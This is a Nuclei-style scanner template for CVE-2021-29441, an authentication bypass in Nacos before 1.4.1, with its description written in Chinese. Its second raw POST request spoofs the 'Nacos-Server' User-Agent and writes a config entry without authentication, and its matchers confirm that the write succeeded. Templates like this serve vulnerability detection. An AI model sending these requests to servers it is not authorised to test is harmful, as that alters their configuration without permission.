id: CVE-2021-29441

info:
  name: Nacos <1.4.1 - 认证绕过(CVE-2021-29441)
  author: dwisiswant0
  severity: critical
  description: |
    在1.4.1版本之前的Nacos中，当配置为使用身份验证时(-Dnacos.core.auth.enabled=true)
    Nacos使用AuthFilter servlet过滤器来强制身份验证。这个过滤器有个后门
    使Nacos服务器绕过此过滤器，从而跳过身份验证检查。
    这种机制依赖于用户代理HTTP报头，因此很容易被欺骗。
    这个问题可能允许任何用户在Nacos服务器上执行任何管理任务.
  tags: nacos
  metadata:
    max-request: 2

http:
  - raw:
      - |
        POST /nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

      - |
        POST /nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        User-Agent: Nacos-Server

    req-condition: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 403"
          - "status_code_2 == 200"
        condition: and

      - type: dsl
        dsl:
          - "contains(body_1, 'Forbidden')"
          - "body_2 == 'true'"
        condition: and

      - type: word
        words:
          - "application/json"
        part: header
